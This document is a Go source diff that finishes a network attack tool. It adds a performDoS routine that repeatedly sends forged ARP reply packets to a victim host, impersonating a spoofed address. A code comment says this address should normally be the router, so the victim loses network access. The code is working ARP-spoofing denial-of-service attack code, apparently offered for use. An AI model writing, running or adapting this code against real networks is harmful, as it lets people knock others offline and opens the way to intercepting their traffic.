@@ -7,6 +7,9 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"os"
+	"os/signal"
+	"syscall"
 	"time"
 
 	"github.com/google/gopacket"
@@ -173,6 +176,23 @@ func Ole() {
 	*/
 }
 
+func performDoS(iface *net.Interface, handler *pcap.Handle, addr *net.IPNet, dstMACAddr []byte, dstAddr string, finish <-chan os.Signal) error {
+	validAddr := utils.FormatAddr(dstAddr)
+	fmt.Println(addr)
+	for {
+		select {
+		case <-finish:
+			return errors.New("Program finished by user")
+		default:
+			if err := utils.WriteARP(2, handler, iface, addr, dstMACAddr, validAddr); err != nil {
+				log.Fatal(err)
+			}
+			fmt.Println("Sending ARP packet to the target")
+			time.Sleep(time.Second * 5)
+		}
+	}
+}
+
 func getInterface(ifaceName string) (*net.Interface, error) {
 	ifaces, err := net.Interfaces()
 	if err != nil {
@@ -192,7 +212,7 @@ func getDstMACAddr(iface *net.Interface, handler *pcap.Handle, addr *net.IPNet, 
 	ctx := context.Background()
 	ctx, cancel := context.WithTimeout(ctx, time.Second*30)
 	go utils.ReadARP(handler, iface, addresses, ctx.Done())
-	if err := utils.WriteARP(handler, iface, addr, []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, utils.FormatAddr(dstAddr)); err != nil {
+	if err := utils.WriteARP(1, handler, iface, addr, []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, utils.FormatAddr(dstAddr)); err != nil {
 		log.Printf("error writing arp reply packets on %v: %v", iface.Name, err)
 		log.Fatal(err)
 	}
@@ -205,6 +225,7 @@ func getDstMACAddr(iface *net.Interface, handler *pcap.Handle, addr *net.IPNet, 
 			}
 		case <-ctx.Done():
 			fmt.Println("Time out: No MAC address found for the victim address")
+			return []byte{}, errors.New("Time out")
 		}
 	}
 	return []byte{}, fmt.Errorf("Could not found the MAC address for %s", dstAddr)
@@ -214,9 +235,8 @@ func Run(ifaceName string, dstAddr, fakeAddr string) error {
 	//Normally to perform a DoS attack fakeAddr should be the router address
 	//Address format => 192.168.1.1
 	fmt.Println("Dos attack running")
-	fmt.Println(ifaceName)
-	fmt.Println(dstAddr)
-	fmt.Println(fakeAddr)
+	c := make(chan os.Signal, 1)
+	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
 
 	iface, err := getInterface(ifaceName)
 	if err != nil {
@@ -239,8 +259,11 @@ func Run(ifaceName string, dstAddr, fakeAddr string) error {
 	if err != nil {
 		return err
 	}
-	fmt.Println("Dest MAC:")
-	fmt.Println(net.HardwareAddr(dstMACAddr))
 
+	fakeIP := net.IPNet{IP: utils.FormatAddr(fakeAddr), Mask: addr.Mask}
+	err = performDoS(iface, handle, &fakeIP, dstMACAddr, dstAddr, c)
+	if err != nil {
+		return err
+	}
 	return nil
 }
